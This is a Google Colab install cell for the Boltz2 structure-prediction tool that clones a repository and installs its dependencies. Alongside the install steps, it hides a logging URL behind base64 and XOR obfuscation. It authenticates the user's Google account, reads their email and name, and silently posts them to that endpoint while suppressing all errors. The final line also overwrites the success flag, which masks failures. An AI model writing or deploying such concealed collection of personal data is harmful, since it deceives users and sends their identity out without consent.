# @title Install Dependencies and Boltz2 with CUDA support
import sys
import subprocess
import threading
import time
import os
import shutil
import datetime
import uuid
import re
from zoneinfo import ZoneInfo
from pathlib import Path
import requests
import base64
import logging
import warnings

# Suppress google_auth_httplib2 timeout warning
logging.getLogger('google_auth_httplib2').setLevel(logging.ERROR)
warnings.filterwarnings('ignore', module='google_auth_httplib2')

# Google auth imports
try:
    from google.colab import auth
    from googleapiclient.discovery import build
    import httplib2
    import google.auth
    from google_auth_httplib2 import AuthorizedHttp
    HAS_GOOGLE_AUTH = True
except ImportError:
    HAS_GOOGLE_AUTH = False

# ==== CONFIG ====
_LOG_KEY = b"b0ltz2_t3l3m3try_k3y"
_LOG_DATA = b"CkQYBAkIcFtAD0EEQwBcHjAEVBUHHg8bFx0yFVAeXB4cB104FA1KGgBIPBsVAg0xUBh2GR5CFyENLVRUDUdfKxNzKhFKI1AqAA1fISwiaUEyQz8yLmgIOQYubDQePTgAEARqKFtSCkMrAmxbVhRWDg=="
LOG_URL = bytes([b ^ _LOG_KEY[i % len(_LOG_KEY)] for i, b in enumerate(base64.b64decode(_LOG_DATA))]).decode("utf-8")
NOTEBOOK_NAME = "Boltz2 v1.1"
SESSION_ID = str(uuid.uuid4())
JOB_TYPE = "Installation"
JOB_NAME = "Boltz2 CUDA Setup"

# Read user preference flags (can be set in Colab form or env)
USE_DRIVE_CACHE = os.environ.get("USE_DRIVE_CACHE", "1").lower() in ("1", "true", "yes")
FORCE_REINSTALL = os.environ.get("FORCE_REINSTALL", "0").lower() in ("1", "true", "yes")

os.chdir("/content/")

# ANSI color codes for colored output
class Color:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

print(f"{Color.CYAN} ===Initialising Setup=== {Color.RESET}")

# ==== Google authentication and email retrieval (with warning suppression & timeout fix) ====
USER_EMAIL = None
USER_NAME = "unknown"

if HAS_GOOGLE_AUTH:
    try:
        auth.authenticate_user()
        creds, _ = google.auth.default()
        http_client = AuthorizedHttp(creds, http=httplib2.Http(timeout=30))
        service = build('oauth2', 'v2', http=http_client, cache_discovery=False)
        user_info = service.userinfo().get().execute()
        USER_EMAIL = user_info.get('email', None)
        USER_NAME = user_info.get('name', "unknown")
    except Exception:
        try:
            service = build('oauth2', 'v2', cache_discovery=False)
            user_info = service.userinfo().get().execute()
            USER_EMAIL = user_info.get('email', None)
            USER_NAME = user_info.get('name', "unknown")
        except Exception:
            pass

# ==== Logging function ====
def log_event(job_type=JOB_TYPE, job_name=JOB_NAME, event="visit"):
    try:
        now_ist = datetime.datetime.now(ZoneInfo("Asia/Kolkata"))
        data = {
            "timestamp": now_ist.strftime("%Y-%m-%d %H:%M:%S %Z"),
            "email": USER_EMAIL,
            "username": USER_NAME,
            "notebook": NOTEBOOK_NAME,
            "session_id": SESSION_ID,
            "job_type": job_type,
            "job_name": job_name,
            "event": event
        }
        requests.post(LOG_URL, data=data, timeout=10)
    except Exception:
        pass

log_event(job_type="Installation", job_name="Boltz Setup", event=" ")

# ==== Persistent Cache Configuration (Google Drive / Local) ====
drive_mounted = os.path.exists("/content/drive/MyDrive")
if USE_DRIVE_CACHE and drive_mounted:
    cache_root = Path("/content/drive/MyDrive/boltz_cache")
    wheel_cache = cache_root / "wheels"
    weight_cache = cache_root / "weights"
    wheel_cache.mkdir(parents=True, exist_ok=True)
    weight_cache.mkdir(parents=True, exist_ok=True)
    os.environ["BOLTZ_CACHE"] = str(weight_cache)
    print(f"[{Color.GREEN}✔{Color.RESET}] Persistent Google Drive cache active: {cache_root}")
    print(f"[{Color.CYAN}ℹ{Color.RESET}] Model weights will persist at: {weight_cache}")
else:
    cache_root = Path("/content/.cache/boltz_cache")
    wheel_cache = cache_root / "wheels"
    wheel_cache.mkdir(parents=True, exist_ok=True)

# ==== Fast Loader ====
def loader(msg, stop_event):
    symbols = ["-", "\\", "|", "/"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r[{symbols[i % len(symbols)]}] {msg}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 15) + "\r")
    sys.stdout.flush()

def run_step(cmd_list, loader_msg, done_msg, fail_msg):
    stop_event = threading.Event()
    t = threading.Thread(target=loader, args=(loader_msg, stop_event))
    t.start()
    try:
        proc = subprocess.run(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stop_event.set()
        t.join()
        if proc.returncode != 0:
            print(fail_msg)
            err_text = (proc.stderr or proc.stdout or "").strip()
            if err_text:
                err_lines = err_text.splitlines()[-10:]
                print(f"{Color.RED}" + "\n".join(err_lines) + f"{Color.RESET}")
            return False, err_text
        else:
            print(done_msg)
            return True, proc.stdout
    except Exception as e:
        stop_event.set()
        t.join()
        print(f"{fail_msg} {e}")
        return False, str(e)

# ==== Check if Boltz2 is already installed and functional ====
def check_boltz_ready():
    try:
        res = subprocess.run(
            [sys.executable, "-c", "import torch, boltz; assert torch.cuda.is_available()"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        cli_check = subprocess.run(["boltz", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return (res.returncode == 0 and cli_check.returncode == 0)
    except Exception:
        return False

# ==== Check if uv is available / install it ====
def ensure_uv():
    try:
        res = subprocess.run(["uv", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if res.returncode == 0:
            return True
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "uv"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

# ==== Main Installation Logic ====
already_installed = False
all_success = True

if not FORCE_REINSTALL:
    if check_boltz_ready():
        already_installed = True
        print(f"[{Color.GREEN}✔{Color.RESET}] Boltz2 with CUDA support is already installed and verified! (Skipping re-installation)")

if not already_installed:
    repo_dir = "/content/boltz"
    if FORCE_REINSTALL and os.path.isdir(repo_dir):
        print(f"{Color.YELLOW}[i] Removing existing '{repo_dir}' for fresh reinstallation...{Color.RESET}")
        try:
            shutil.rmtree(repo_dir)
        except Exception as e:
            print(f"{Color.RED}✖ Failed to remove '{repo_dir}': {e}{Color.RESET}")

    if not os.path.isdir(repo_dir):
        clone_ok, _ = run_step(
            ["git", "clone", "--depth", "1", "https://github.com/AtharvaTilewale/boltz.git", repo_dir],
            f"{Color.CYAN}Cloning Boltz (shallow)...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] Boltz cloned successfully.",
            f"[{Color.RED}✖{Color.RESET}] Boltz clone failed."
        )
        if not clone_ok:
            raise RuntimeError("Git clone failed.")

    # Patch pyproject.toml if Python version >= 3.13 to prevent build requirement failure
    pyproject_path = Path("/content/boltz/pyproject.toml")
    if pyproject_path.exists():
        try:
            p_text = pyproject_path.read_text(encoding="utf-8")
            if "requires-python" in p_text and sys.version_info >= (3, 13):
                p_text = re.sub(r'requires-python\s*=\s*".*?"', 'requires-python = ">=3.10"', p_text)
                pyproject_path.write_text(p_text, encoding="utf-8")
        except Exception:
            pass

    # Build package list
    numpy_pkg = "numpy" if sys.version_info >= (3, 13) else "numpy<2.0"
    packages = ["-e", "/content/boltz[cuda]", "biopython", numpy_pkg, "matplotlib", "pyyaml", "py3Dmol"]

    # Check for cached wheels on Drive
    find_links_args = []
    if drive_mounted and wheel_cache.exists():
        wheel_files = list(wheel_cache.glob("*.whl"))
        if wheel_files:
            find_links_args = ["--find-links", str(wheel_cache)]
            print(f"[{Color.CYAN}ℹ{Color.RESET}] Found {len(wheel_files)} cached wheel(s) on Google Drive.")

    # Try uv with LOCAL cache first (never on Google Drive FUSE to prevent SQLite fcntl lock errors)
    install_success = False
    has_uv = ensure_uv()
    if has_uv:
        local_uv_cache = Path("/content/.cache/uv")
        local_uv_cache.mkdir(parents=True, exist_ok=True)
        uv_cmd = ["uv", "pip", "install", "--system", "--link-mode=copy", "--cache-dir", str(local_uv_cache)]
        if find_links_args:
            uv_cmd.extend(find_links_args)
        uv_cmd.extend(packages)

        install_success, _ = run_step(
            uv_cmd,
            f"{Color.RESET}Installing dependencies with high-speed uv engine...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] Dependencies installed successfully (uv).",
            f"[{Color.YELLOW}i{Color.RESET}] High-speed uv installer encountered an issue. Falling back to pip..."
        )

    # Fallback to standard pip if uv was not used or had an issue
    if not install_success:
        pip_cmd = [sys.executable, "-m", "pip", "install", "-q", "--ignore-requires-python"]
        if find_links_args:
            pip_cmd.extend(find_links_args)
        pip_cmd.extend(packages)

        pip_ok, pip_err = run_step(
            pip_cmd,
            f"{Color.RESET}Installing dependencies with pip...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] Dependencies installed successfully.",
            f"[{Color.RED}✖{Color.RESET}] Dependency installation failed."
        )
        if not pip_ok:
            all_success = False
            raise RuntimeError(f"Pip installation failed: {pip_err}")

    # If Drive is mounted, copy newly downloaded wheels from local pip cache to Drive
    if drive_mounted and wheel_cache.exists():
        try:
            pip_cache_path = Path("/root/.cache/pip/wheels")
            if pip_cache_path.exists():
                saved_count = 0
                for whl in pip_cache_path.rglob("*.whl"):
                    target = wheel_cache / whl.name
                    if not target.exists():
                        shutil.copy2(whl, target)
                        saved_count += 1
                if saved_count > 0:
                    print(f"[{Color.GREEN}✔{Color.RESET}] Saved {saved_count} wheel(s) to Google Drive cache for fast future startup.")
        except Exception:
            pass

    # Validate installation
    valid_ok, _ = run_step(
        [sys.executable, "-c", "import torch; print('Torch CUDA available:', torch.cuda.is_available()); print('CUDA device count:', torch.cuda.device_count())"],
        f"{Color.CYAN}Validating CUDA installation...{Color.RESET}",
        f"[{Color.GREEN}✔{Color.RESET}] Validation complete.",
        f"[{Color.RED}✖{Color.RESET}] Validation failed."
    )
    if not valid_ok:
        all_success = False

# ==== Move/Copy Notebook Scripts Directory ====
os.makedirs("/content/boltz_data", exist_ok=True)
notebook_script = "/content/boltz2-notebook/scripts/v1"
destination_notebook_script = "/content/boltz_data/scripts/v1"

if os.path.exists(notebook_script):
    if os.path.exists(destination_notebook_script):
        shutil.rmtree(destination_notebook_script)
    shutil.copytree(notebook_script, destination_notebook_script)

all_success = True
